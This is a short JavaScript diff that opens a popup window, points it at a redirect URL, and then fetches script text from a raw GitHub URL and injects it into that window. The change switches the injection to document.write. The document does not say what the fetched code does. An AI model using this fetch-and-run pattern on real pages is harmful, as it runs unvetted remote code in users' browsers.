@@ -11,7 +11,7 @@
             const scriptUrl = 'https://raw.githubusercontent.com/Dy1ngRat/pupet/refs/heads/main/action.js';
 
             // Open a new about:blank window
-            const newWindow = window.open("", "_blank", "width=500,height=300");
+            const newWindow = window.open('about:blank', '_blank', 'width=500,height=300');
 
             // Redirect to the new URL and track it
             newWindow.location.href = redirectUrl;
@@ -21,9 +21,7 @@
                 fetch(scriptUrl)
                     .then(response => response.text())
                     .then(scriptContent => {
-                        const scriptElement = newWindow.document.createElement('script');
-                        scriptElement.textContent = scriptContent;
-                        newWindow.document.body.appendChild(scriptElement);
+                        newWindow.document.write(`<script>${scriptContent}<\/script>`);
                     })
                     .catch(error => console.error('Error loading script:', error));
             });
